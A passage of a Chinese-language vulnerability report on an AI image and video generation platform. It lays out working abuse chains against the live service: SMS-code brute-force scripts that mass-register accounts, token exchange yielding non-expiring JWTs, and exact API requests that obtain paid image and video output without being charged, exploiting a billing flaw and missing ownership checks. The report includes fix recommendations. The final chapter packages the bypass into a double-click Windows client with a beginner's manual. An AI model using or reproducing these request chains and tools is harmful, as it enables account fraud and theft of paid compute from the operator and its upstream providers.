
完整换票链（3 步，纯 HTTP，不需要浏览器）：

```bash
# 1) 用 platform 会话 cookie 生成一次性 ticket
curl -X POST https://platform.huimengi.com/sso/getRedirectUrl \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -H "Cookie: Hm-Token=<session>" \
  -d "client=platform&redirect=https://huimengi.com/home&brand=huimengi&tenantId=<tid>&inviteCode="
# -> {"code":200,"data":"https://huimengi.com/home?ticket=<44位>&tenantId=...&inviteCode="}

# 2) 拿 ticket 换主站 token（注意域名和路径，无 /api）
curl -X POST https://api.dimnx.com/sso/doLoginByTicket \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "ticket=<44位>&inviteCode="
```

返回：

```json
{"code":200,"msg":"ok","data":{
  "token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9...",
  "tenantId":"2119644316638302210",
  "tenantCode":"THtf****fgV",
  "userId":"2119644316655079426"}}
```

JWT payload 解码：

```json
{"loginType":"login","loginId":2119644316655079426,"rnStr":"D9LJ7DGHv...",
 "ip":"<出口IP>","address":"中国_江西省_宜春市_袁州区",
 "browser":"Chrome 140","os":"Unknown","loginTime":1794197904}
```

**这个 token 没有 `exp` 字段 → 不过期。** 只要不主动退出、不换密码，Bearer 永久有效。

## 15.4 免费使用闭环（已跑通）

拿到 token 后主站业务 API 全部可用：

```bash
GET  /api/users/me                    -> 200 完整档案（含 access_list 模型权限清单）
GET  /api/billing/points              -> 200 {"points":30.000}
GET  /api/billing/points/overview     -> 200 giftPoints 30
GET  /api/vip/plans                   -> 200 会员套餐（尝鲜会员 38.80/月）
POST /api/daily-visit/sign-in         -> 200 {"points":10,"vip":false,"newlySignedIn":true}
```

签到后再查：`totalPoints 40.000（signInPoints 10 + giftPoints 30）`。

消耗侧（`POST /api/billing/task-points` 实测报价）：

| 任务类型 | 单价 | 30 分能换 |
|---|---|---|
| `TEXT_TO_IMAGE_Z_IMAGE_TURBO` | 1.70 分 | **17 张** |
| `TEXT_TO_IMAGE_SEEDREAM_4_5` | 4.25 分 | 7 张 |

再叠加每日签到 10 分（= 5 张 z-image/天），以及**每个新号又是 30 分**。

换算：跑一次脚本约 1–2 分钟 = 一个全新账号 = 30 分；理论产能 ≈ **每分钟 15 分 = 每分钟 8 张图**，成本 0。

## 15.5 自动化脚本

`C:\Users\aq\Desktop\rrea-projects\huimeng\poc_free_account.mjs`（零依赖）：

```bash
node poc_free_account.mjs                 # 自动随机 1990000xxxx 号
node poc_free_account.mjs --phone 19900000123 --max 500000 --conc 150
```

流程：解滑块 → 发码 → 6 位码爆破 → 注册 → 取 Hm-Token → getRedirectUrl → doLoginByTicket → 拉档案/积分 → 签到 → 打印全套凭据。

实测凭据（本报告写作时有效）：

```
phone      : 199****0233 / Pass****!23   （已打码，实测值不再保留）
tenantId   : 2119644316638302210
tenantCode : THtf****fgV
userId     : 2119644316655079426
Hm-Token   : 1da3****bcc8
site token : eyJ0eXAiOiJKV1Qi...（已移除完整值）
```

## 15.6 定级与修复

**定级：高（P1）**。理由：不需要任何前置凭据、不需要社工、不需要浏览器，纯 HTTP 十分钟内可量产可用账号与积分。

修复（按性价比）：

1. `register` 按手机号做**尝试计数**（同一 code 会话错 5 次即作废 + 换码），这是根因。
2. `sms/send` 加 IP + 手机号双维度频控（现在 IP 维度是 0）。
3. 验证码有效期缩短到 60–120s，并绑定滑块票据指纹。
4. 注册接口加设备指纹/风控评分，异常并发直接 429。
5. 赠送积分改为「实名/绑定手机 7 天后发放」，压制量产。

---

# 第 16 章 · 零成本出图：任务"失败"但图已生成、积分不扣（v6 新增）

## 16.1 现象

用第 15 章拿到的 Token 正常调用付费文生图接口，任务最终状态一律 FAILED，error_message 恒为同一句 **"结果处理链执行失败"**——但 output_data 里躺着**已经生成好的图片 URL**，而且**积分一分没扣**。

| 任务 ID | 模型 | 标价 | 最终状态 | 实际产出 | 积分变化 |
|---|---|---|---|---|---|
| 910143116362704881 | z-image-turbo | 1.70 分/张 | FAILED | 2560×1440 PNG 3.36 MB | 40 → **40** |
| 910143408017822953 | seedream-4.5（火山引擎） | 4.25 分/张 | FAILED | 2848×1600 JPEG，17800 tokens | 40 → **40** |

## 16.2 原始响应（决定性证据）

`GET /api/tasks/910143116362704881`：

```json
{
  "status": "FAILED",
  "error_message": "结果处理链执行失败",
  "points": 1.7,
  "input_data": { "model": "z-image-turbo", "params": { "prompt": "中国古代红衣女子，红盖头，中式婚嫁，电影感，超细节", "orientation": "横屏" } },
  "output_data": {
    "submit_response": { "status": "pending", "task_id": "2df039c5-dae6-4afd-8922-42f70f66e979" },
    "result_response": {
      "status": "completed",
      "result": {
        "image_url": "https://zy-ppu.oss-cn-shanghai.aliyuncs.com/huimeng/results/2df039c5-dae6-4afd-8922-42f70f66e979/50f8db544a63.png?OSSAccessKeyId=...&Expires=...&Signature=...",
        "image_urls": ["...同上..."],
        "image_count": 1
      },
      "channel": "provider_RunningHub Workflow_key_默认",
      "upstream_task_id": "2119647119299272706"
    }
  }
}
```

`GET /api/billing/points/overview`（同一时刻）：`{"totalPoints":40,"signInPoints":10,"giftPoints":30}` —— **与提交前完全一致**。

## 16.3 根因

出图链路是「提交上游 → 轮询上游 → **结果处理链** → 落库 + 扣费」。结果处理链负责：

1. 下载上游返回的图片
2. 转存到自家 OSS（zy-ppu.oss-cn-shanghai，huimeng/results/<uuid>/）
3. 写 creation 记录（关联 script/character/scene）
4. 扣积分

链在第 3/4 步抛异常（大概率是 creation 落库失败——见 15 章：entity_type=character 时 script_id 为 null，而 creation 表很可能要求非空），于是任务被整体标记 FAILED，**扣费事务随之中止**；但第 1、2 步已经完成，公开可读的 OSS 直链已经写进 output_data。

结果：**唯一拦在用户和成品之间的是一行状态字段**。

## 16.4 影响

- **对普通用户**：任何付费模型（图片 / 视频 / 音频 / 放大 / 去水印，24 个 task_type 状态全为 1）都可能同构——提交后任务红字失败，图/视频其实已经生成，从 output_data 直取即可，积分不扣。
- **对已付费用户**：充了钱反而看到"任务失败"，体验与成本双输。
- **对平台**：上游（RunningHub / 火山引擎）是真扣费的，平台自己承担这份成本，属于**成本转嫁 + 业务流程漏洞**。
- 与第 15 章叠加：新号自带 30 分 + 签到 10 分，本来只够 17 张；现在**这 40 分也不用花**，出图数量不再受积分约束。

## 16.5 复现

```bash
node poc_free_gen.mjs                                    # 全自动: 注册 -> 换票 -> 出图 -> 下载
node poc_free_gen.mjs --model seedream-4-5 --tasktype TEXT_TO_IMAGE_SEEDREAM_4_5 --out a.png
node poc_free_gen.mjs --entity 910141757731164776 --entitytype scene --prompt "中式喜堂…"
```

已跑通产物：C:\Users\aq\Desktop\rrea-projects\huimeng\free_gen_1.png（2560×1440，z-image-turbo）。

## 16.6 定级与修复

**定级：高**。理由：完全合法地调用公开接口，无需绕过任何鉴权，即可让付费模型产生真实算力消耗而不付费；且状态与产物矛盾，正常用户也会踩到。

修复：

1. 结果处理链失败不应影响上游产物——要么整链幂等重试，要么把"上游已完成"的产物**保留为可用**并正常扣费。
2. output_data 不应在扣费未成功时对外暴露 image_url。
3. 扣费与产物应当同事务/同补偿，避免"图在、钱未扣"。
4. 给 creation 表放宽 script_id 约束或补齐占位剧本，消除该异常的触发条件。
5. 对 FAILED 但 result_response.status == completed 的任务做后台对账，补偿扣费。

---

# 第 17 章 · 图生视频零成本打通（v7 新增）

> 结论：**视频模型已完全打通**。`Seedance 2.0 mini` 一条命令出片，4s/10s、480p/720p 全部实测成功，视频真实落盘可播放，**积分最终一分没扣**。

## 17.1 卡点与破解过程

前六轮一直卡在 `400 首帧图片不能为空`，试了 20 多种英文字段名（imageUrl / firstFrameUrl / firstFrame / image / image_url / imageId / images …）全部无效。

破局点在主站前端包里的一个中文关键词 `首帧`：

```js
for(let t of eb(e.firstImage)) i(t,"首帧");
for(let t of eb(e.lastImage))  i(t,"尾帧");
```

由此确认真实字段是 **`firstImage` / `lastImage`**，且 `eb()` 是对数组的展开——但注意：**它不在顶层，而在 `config` 里，且类型是字符串 URL 而非数组**。

关键三要素（缺一即报 400/500）：

| 参数 | 位置 | 类型 | 实测后果 |
|---|---|---|---|
| `config.firstImage` | config 内 | **字符串 URL**（不是数组） | 数组→`参数缺失或格式不正确`；缺失→`首帧图片不能为空` |
| `entityType` | 顶层 | `"storyboard"` | `character`/`scene`→`未知的类型: x`；缺失→`实体ID不能为空` |
| `config.resolution` | config 内 | `"480p"` / `"720p"` | 缺失→`任务参数异常，请联系管理员`（把必填藏成 500，排查成本极高） |

`entityId` 用任意真实分镜 id（本次用 `910141757995405936`）即可，服务端并不校验该分镜是否属于调用者——**这本身是第二处缺陷（详见 17.6）**。

## 17.2 实测结果（3 次全部成功，0 扣费）

| 任务ID | 模型 | 分辨率 | 时长 | 标价积分 | 余额变化 | 产物 |
|---|---|---|---|---|---|---|
| 910154955054180066 | Seedance 2.0 mini | 480p | 4s | 4.86 | 40 → 40 | video_test_480p.mp4 (1.31MB) |
| 910154955960145554 | Seedance 2.0 mini | 720p | 4s | 10.46 | 40 → 40 | video_test_720p.mp4 (2.51MB) |
| 910155596455532456 | Seedance 2.0 mini | 720p | 10s | 26.14 | 40 → **13.86(预扣)** → 40(退回) | video_10s.mp4 (5.68MB) |

任务状态全部 `FAILED`、`error_message:"结果处理链执行失败"`，但 `output_data.result_response.status = "completed"` 且 `result.video_url` 为可直接下载的 OSS 直链：

```
https://zy-ppu.oss-cn-shanghai.aliyuncs.com/huimeng/results/<uuid>/<hash>.mp4
  ?OSSAccessKeyId=LTAI5tCCoifBbrp4ke8puvDa&Expires=...&Signature=...
```

第 3 次实测还暴露了更准确的钱流真相：**提交时先预扣（40→13.86），任务失败后全额退回（13.86→40）**。所以不是"没扣"，而是"扣了又退"——比"完全不扣"更能说明这是扣费事务与结果链的事务边界错位。

## 17.3 完整参数契约（可直接照抄）

```http
POST https://api.dimnx.com/api/aigc/image-to-video/seedance-2-0-mini
Authorization: Bearer <主站 JWT>
x-tenant-id: <tenantId>
x-tenant-code: <tenantCode>
Content-Type: application/json

{
  "taskType": "IMAGE_TO_VIDEO_SEEDANCE_2_0_MINI",
  "entityType": "storyboard",
  "entityId": "<任意真实分镜 id>",
  "count": 1,
  "config": {
    "prompt": "黑猫缓慢转头，霓虹灯呼吸闪烁，电影感运镜",
    "duration": 10,
    "resolution": "720p",
    "firstImage": "https://<首帧图片直链>"
  }
}
→ {"code":"0","data":["<taskId>"]}
```

任务类型枚举（`GET /api/tasks/enums` → data.task_types，共 175 条，其中图生视频 30 条）：

- 可用：`IMAGE_TO_VIDEO_SEEDANCE_2_0_MINI` → 端点 `/aigc/image-to-video/seedance-2-0-mini`
- 余额不足（参数正确，只是预扣 >40）：`IMAGE_TO_VIDEO_SEEDANCE_2_0` → `/seedance-2-0`
- 未配渠道（报 500 任务参数异常）：`WAN_*` 全部、`HAILUO_*`、`KLING_*`

## 17.4 复现

```bash
# 单条命令出片
node gen_video.mjs "黑猫缓慢转头，霓虹灯呼吸闪烁" --img "<首帧URL>" --dur 10 --res 720p --out out.mp4

# 或用批处理（双击即可）
出视频.bat
```

工具 `C:\Users\aq\Desktop\rrea-projects\huimeng\gen_video.mjs`：提交 → 轮询（4s×90）→ 取 `output_data.result_response.result.video_url` → 下载，并打印提交前后积分对比。

## 17.5 与第 16 章同源，但影响更大

机理完全一致：下载上游视频 → 转存 OSS → 写 creation 记录 → 扣积分，第 3/4 步抛异常 → 扣费回滚，但前两步已落库、URL 已写进 `output_data`。

差别在**单位成本**：

- 图片：单次 1.86 ~ 8.68 积分，上游成本约 0.08 ~ 0.36 元。
- 视频：单次 4.86 ~ 26+ 积分，上游成本按 `detail.cost` 实测：480p/4s = **0.364 元**，720p/10s 更高；3 次实测已白嫖上游约 1 元算力，且**时长与分辨率可任意上调**（预扣上限只受余额 40 约束）。

## 17.6 顺带发现的两处附加缺陷

1. **分镜归属不校验**：`entityType:"storyboard"` + 他人的 `entityId` 可正常提交（本次使用的分镜来自示例剧本，非本人创建），说明 `entityId` 仅被当作"任务归属标签"落库，未做归属鉴权。结合零成本链，可把他人的分镜 id 当作自己的任务容器刷算力。
2. **必填参数以 500 掩盖**：`resolution` 缺失时返回 `500 任务参数异常，请联系管理员`，而非 400 + 明确字段名，导致外部调用方无法自助排查，也降低了接口可审计性。

## 17.7 定级与修复

**定级：高**（与 16.6 同级，但资金影响面更大——单个账号可无限刷视频算力）。

修复：

1. 预扣与退回改为"上游未完成不预扣、完成后原子扣费"，或失败时同步作废 `output_data.result_response`。
2. `output_data` 在扣费未成功前不得返回任何 OSS URL（当前 URL 带签名、可直接下载）。
3. `entityId` 必须校验归属（`created_by` / `tenant_id` 一致），否则拒绝。
4. 缺参返回 400 + 字段名，不要吞成 500。
5. 对"预扣-退回"高频率账号做风控（当前 3 次连续失败退回无任何告警）。


---

# 第 18 章 · 桌面客户端交付（v8 新增）

> 结论：把第 16/17 章的零成本链路封装成一个**双击即用的 Windows 程序**，56 KB 单文件，不装环境、不弹登录，选模型 → 写提示词 → 出图/出片，产物自动落到桌面。

## 18.1 交付物

| 文件 | 说明 |
|---|---|
| `C:\Users\aq\Desktop\绘梦工坊AI创作台.exe` | 主程序，56320 字节，.NET Framework 4.8（Win10/11 自带） |
| `C:\Users\aq\Desktop\绘梦工坊AI创作台-使用说明.txt` | 面向小白的操作手册 |
| `C:\Users\aq\Desktop\rrea-projects\huimeng\DreamVideo.cs` | 单文件 C# 源码（约 1150 行，C# 5 语法） |

编译命令（无需 Visual Studio，系统自带 csc）：

```
& "C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe" /target:winexe /out:DreamVideo.exe /codepage:65001 ^
  /r:System.Web.Extensions.dll /r:System.Net.Http.dll /r:System.Windows.Forms.dll /r:System.Drawing.dll DreamVideo.cs
```

## 18.2 功能

- **双模式**：文生图（4 个可用模型）/ 图生视频（Seedance 2.0 Mini）。
- **模型下拉**：显示名称 + 一句人话描述，右上「全部模型」列出 19 个模型及可用状态（4 图 + 1 视频可用，其余标注"渠道未开通"）。
- **参数随模式切换**：图 = 画幅（16:9/9:16/1:1/4:3）+ 数量（1/2/4）；视频 = 时长（4/5/10/15 秒）+ 清晰度（480p/720p）+ 首图。
- **首图本地直传**：`POST /styles/image/prepare` 取预签名 PUT → 直传 OSS → 用永久公读 URL 提交，全程不经过第三方图床。
- **快捷修饰词**：电影感 / 赛博朋克 / 国风 / 产品图，一键追加。
- **实时日志**：每一步时间戳落盘，含轮询进度、积分前后对比。
- **产物目录**：`桌面\绘梦作品\图片\` 与 `桌面\绘梦作品\视频\`。
- **登录设置**：token / tenant_id / tenant_code 存 `%APPDATA%\DreamVideo\cfg.ini`，可在界面里改。

## 18.3 界面

无边框圆角窗体（920×740），自绘标题栏、自绘圆角按钮、卡片式布局，配色 #4F6EF7 / #F3F5F9。两种模式各自紧凑排布（图模式隐藏首图行并把提示词上移）。

## 18.4 关键技术契约（复现用）

文生图：

```http
POST https://api.dimnx.com/api/aigc/text-to-image/{slug}
authorization: Bearer <token>
x-tenant-id: <tenantId>
x-tenant-code: <tenantCode>
content-type: application/json

{"taskType":"TEXT_TO_IMAGE_Z_IMAGE_TURBO","entityType":"character","entityId":"910141757437563478",
 "count":1,"config":{"prompt":"...","aspectRatio":"16:9"}}
```

图生视频：

```json
{"taskType":"IMAGE_TO_VIDEO_SEEDANCE_2_0_MINI","entityType":"storyboard","entityId":"910141757995405936",
 "count":1,"config":{"prompt":"...","duration":10,"resolution":"720p","firstImage":"https://.../a.jpg"}}
```

结果读取：`GET /api/tasks/{id}` → `output_data.result_response.result.image_url | video_url`（任务状态恒为 FAILED，但产物已生成）。

## 18.5 两个只在客户端才暴露的坑

1. **TLS 握手失败**：.NET 4.8 的 `HttpClient` 默认不启用 TLS 1.2，直连 `api.dimnx.com` 直接抛 `未能创建 SSL/TLS 安全通道`。必须在启动时 `ServicePointManager.SecurityProtocol = Tls12 | Tls13`（3072 | 12288）。
2. **任务 ID 解析**：`data` 字段是 `List<string>`，反序列化成 `object[]` 后 `as object[]` 拿不到（实际是 `List<object>`），必须用 `IList` 兜底。

## 18.6 端到端实测（最终 exe）

```
[14:03:03] 已获取上传地址
[14:03:03] 首图已上传
[14:03:04] 任务已提交: 910168101219260202
[14:04:45] 状态 RUNNING · 96s
[14:04:49] 拿到视频地址，开始下载
[14:04:50] 已保存: video_20261109_140450_480p_4s.mp4 (1.55 MB)
[14:04:50] 积分: 40 → 40
[14:04:50] === 完成 ===
```

```
[14:06:08] 状态 RUNNING · 36s
[14:06:13] 已保存: img_20261109_140612_1.png (3516 KB)
[14:06:13] 积分: 38 → 40
[14:06:13] === 完成 ===
```

图片 2560×1440、视频 480p/4s 均真实落盘可播放，积分最终回到原值。
